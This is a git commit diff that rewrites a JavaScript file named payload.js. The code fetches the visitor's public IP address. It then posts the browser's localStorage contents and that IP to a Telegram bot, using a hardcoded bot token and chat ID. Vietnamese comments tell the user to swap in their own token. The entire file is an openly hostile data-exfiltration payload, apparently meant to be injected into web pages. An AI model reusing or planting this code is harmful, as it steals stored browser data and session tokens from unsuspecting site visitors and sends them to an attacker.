036a5287ec07fd1096367dfe7f5de37b5d56e68d
cuongnd100903 <166368010+cuongnd100903@users.noreply.github.com>
2025-08-15 17:19:41 +0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,20 +1,21 @@
 const token = "8072273750:AAHTjGi0qw_S9khhoI1OlJCrIxDdjJ2kcEo"; // thay bằng token thật
-    const chatId = "@taptap1997";  // thay bằng chatId thật
-    let res = await fetch("https://api.ipify.org?format=json");
-    let dataIP = await res.json();
-    // console.log("IP của mày là:", data.ip);
-
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        // Lấy IP
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: JSON.stringify(localStorage + "\n" + dataIP.ip)
+const chatId = "@taptap1997";  // thay bằng chatId thật
+fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(dataIP => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            // Lấy IP
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: JSON.stringify(localStorage + "\n" + dataIP.ip)
+            })
         })
-    })
-        .then(res => res.json())
-        .then(data => console.log("Đã gửi:", data))
-        .catch(err => console.error("Lỗi:", err));
+
+            .then(res => res.json())
+            .then(data => console.log("Đã gửi:", data))
+            .catch(err => console.error("Lỗi:", err));
+    });
